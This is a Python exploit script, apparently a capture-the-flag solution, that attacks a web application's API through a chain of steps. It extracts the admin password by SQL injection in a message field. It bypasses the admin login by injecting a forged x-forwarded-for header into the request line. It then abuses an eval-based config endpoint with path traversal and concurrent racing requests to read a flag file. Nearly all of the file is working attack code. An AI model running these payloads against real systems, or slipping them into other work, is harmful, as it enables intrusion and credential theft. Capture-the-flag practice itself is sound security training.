import codecs
import json
import subprocess
import time


def get_cookie(netloc):
    subprocess.run([
        "curl",
        f"http://{netloc}/api/register",
        "--data",
        '{"name":"foo","password":"bar"}',
    ], check=True)

    subprocess.run([
        "curl",
        f"http://{netloc}/api/login",
        "--data",
        '{"name":"foo","password":"bar"}',
        "-c",
        "cookie.txt",
    ], check=True)

    pw_parts = []
    for idx, sz in ((1, 4), (5, 4), (10, 4), (15, 4), (20, 4), (25, 6), (31, 6)):
        time.sleep(0.5)
        subprocess.run([
            "curl",
            f"http://{netloc}/api/message",
            "--data",
            fr"""{{"message": "0'+(select\nhex\n(substr\n(password\nfrom\n{idx}\nfor\n{sz}\n))\nfrom\nusers\nwhere\nadmin=1))#"}}""",
            "-b",
            "cookie.txt",
        ], check=True)

        process = subprocess.run([
            "curl",
            f"http://{netloc}/api/message",
            "-b",
            "cookie.txt",
        ], check=True, capture_output=True)
        msg = json.loads(process.stdout)
        pw_parts.append(codecs.decode(msg["message"], "hex").decode("ascii"))
    pw = "".join(a + b for a, b in zip(pw_parts, ["", "-", "-", "-", "-", "", ""]))
    print(f"{pw = }")

    subprocess.run([
        "curl",
        f"http://{netloc}/admin/login",
        "--data",
        f'{{"name":"admin","password":"{pw}"}}',
        "-c",
        "cookie.txt",
        "-X",
        "POST /admin/login HTTP/1.1\rx-forwarded-for: 127.0.0.1\rfoo: bar",
    ], check=True)


def snapshot1(netloc):
    p1 = subprocess.Popen([
        "curl",
        "-s",
        f"http://{netloc}/admin/config",
        "--data",
        r"""{"eval":"set_config(\"/../../../../../../flag\");sleep(0.1);\"\""}""",
        "-b",
        "cookie.txt",
        "-X",
        "POST /admin/config HTTP/1.1\rx-forwarded-for: 127.0.0.1\rfoo: bar",
    ], stdout=subprocess.PIPE)
    p2 = subprocess.Popen([
        "curl",
        "-s",
        f"http://{netloc}/admin/config",
        "--data",
        r"""{"eval":"set_config(get_config());\"\""}""",
        "-b",
        "cookie.txt",
        "-X",
        "POST /admin/config HTTP/1.1\rx-forwarded-for: 127.0.0.1\rfoo: bar",
    ], stdout=subprocess.PIPE)
    p1.wait()
    p2.wait()
    print(f"{p1.stdout.read() = }")
    print(f"{p2.stdout.read() = }")


def try_once(netloc, batch=100):
    p = []
    for _ in range(batch):
        p.append(subprocess.Popen([
            "curl",
            "-s",
            f"http://{netloc}/admin/config",
            "--data",
            r"""{"eval":"let x=\"////////////////////////////////////////////\";set_config(x);\"flag,flag,flag,flag,flag,flag,flag,flag\""}""",
            "-b",
            "cookie.txt",
            "-X",
            "POST /admin/config HTTP/1.1\rx-forwarded-for: 127.0.0.1\rfoo: bar",
        ], stdout=subprocess.PIPE))
    [x.wait() for x in p]
    for idx, x in enumerate(p):
        #print(f"{idx = } {x.stdout.read() = }")
        print(f"{x.stdout.read() = }")


def main():
    if True:
        netloc = "localhost:8080"
    else:
        netloc = "instance.penguin.0ops.sjtu.cn:18436"
    get_cookie(netloc)
    try_once(netloc)


if __name__ == "__main__":
    main()
